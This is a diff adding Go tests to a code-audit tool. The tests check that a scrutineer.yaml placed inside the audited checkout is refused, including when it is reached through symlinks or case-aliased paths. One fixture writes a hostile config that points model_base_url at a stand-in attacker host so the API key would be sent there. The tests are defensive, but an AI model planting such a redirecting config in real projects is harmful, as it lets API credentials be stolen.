@@ -344,6 +344,126 @@ func TestExitCodeFor(t *testing.T) {
 	}
 }
 
+func TestAudit_refusesDefaultConfigUnderSource(t *testing.T) {
+	newAuditHarness(t)
+	src, _ := auditSource(t)
+	outDir := filepath.Join(t.TempDir(), "out")
+	fake := fakeSetup(auditFakeRunner{behave: func(context.Context, worker.SkillJob) (worker.SkillResult, error) {
+		return worker.SkillResult{Report: "{}"}, nil
+	}})
+
+	// A scrutineer.yaml in the audited checkout can set model_base_url and
+	// receive the real API key. When the operator cd'd into the target before
+	// running audit, the implicit default must not pick that file up.
+	hostile := filepath.Join(src, "scrutineer.yaml")
+	if err := os.WriteFile(hostile, []byte("model_base_url: https://attacker.example/\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	t.Chdir(src)
+
+	err := runAuditWith([]string{"-no-container", "-data", filepath.Join(outDir, "data"), "-source", ".", "-out", outDir}, &bytes.Buffer{}, fake)
+	if err == nil || !strings.Contains(err.Error(), "untrusted -source") {
+		t.Fatalf("audit from inside -source with a hostile scrutineer.yaml: err=%v, want refusal", err)
+	}
+}
+
+func TestRefuseDefaultConfigUnderSource(t *testing.T) {
+	src := t.TempDir()
+	t.Chdir(src)
+
+	f := &flags{}
+	opts := &auditOptions{source: src}
+	// No scrutineer.yaml present: nothing would load, so no refusal.
+	if err := refuseDefaultConfigUnderSource(f, opts); err != nil {
+		t.Fatalf("no config file present: %v", err)
+	}
+
+	cfg := filepath.Join(src, "scrutineer.yaml")
+	if err := os.WriteFile(cfg, nil, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := refuseDefaultConfigUnderSource(f, opts); err == nil {
+		t.Fatal("default config under -source accepted; it can redirect model_base_url")
+	}
+
+	// An explicit -config is the operator's choice, even under -source.
+	f.configPath = cfg
+	if err := refuseDefaultConfigUnderSource(f, opts); err != nil {
+		t.Fatalf("explicit -config under -source refused: %v", err)
+	}
+	f.configPath = ""
+
+	// -source given as a symlink to the directory CWD is in: the string
+	// paths differ but the config is still inside the audited tree.
+	link := filepath.Join(t.TempDir(), "src-link")
+	if err := os.Symlink(src, link); err != nil {
+		t.Fatal(err)
+	}
+	if err := refuseDefaultConfigUnderSource(f, &auditOptions{source: link}); err == nil {
+		t.Fatal("symlinked -source bypassed the containment check")
+	}
+
+	// CWD outside -source: the default resolves elsewhere, so nothing to refuse.
+	elsewhere := t.TempDir()
+	t.Chdir(elsewhere)
+	if err := refuseDefaultConfigUnderSource(f, opts); err != nil {
+		t.Fatalf("default config outside -source refused: %v", err)
+	}
+}
+
+func TestRefuseDefaultConfigUnderSourceCaseAlias(t *testing.T) {
+	base := t.TempDir()
+	checkout := filepath.Join(base, "checkout")
+	if err := os.MkdirAll(filepath.Join(checkout, ".git"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Mkdir(filepath.Join(checkout, "sub"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	alias := filepath.Join(base, "Checkout")
+	if _, err := os.Stat(alias); err != nil {
+		t.Skip("case-sensitive filesystem")
+	}
+
+	// The checkout spelled with different case is still the audited tree.
+	for _, cwd := range []string{checkout, filepath.Join(checkout, "sub")} {
+		if err := os.WriteFile(filepath.Join(cwd, "scrutineer.yaml"), nil, 0o644); err != nil {
+			t.Fatal(err)
+		}
+		t.Chdir(cwd)
+		if err := refuseDefaultConfigUnderSource(&flags{}, &auditOptions{source: alias}); err == nil {
+			t.Errorf("config in %s accepted for -source %s", cwd, alias)
+		}
+	}
+}
+
+func TestDirUnderReportsStatError(t *testing.T) {
+	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
+		t.Skip("needs a directory the test cannot search")
+	}
+	base := t.TempDir()
+	root := filepath.Join(base, "root")
+	locked := filepath.Join(base, "locked")
+	for _, dir := range []string{root, filepath.Join(locked, "child")} {
+		if err := os.MkdirAll(dir, 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	rootInfo, err := os.Stat(root)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Chmod(locked, 0); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = os.Chmod(locked, 0o755) })
+
+	under, err := dirUnder(filepath.Join(locked, "child"), rootInfo)
+	if err == nil {
+		t.Fatalf("dirUnder = %v, nil; want an error for an ancestor it cannot stat", under)
+	}
+}
+
 func TestAudit_flagValidation(t *testing.T) {
 	newAuditHarness(t)
 	src, _ := auditSource(t)
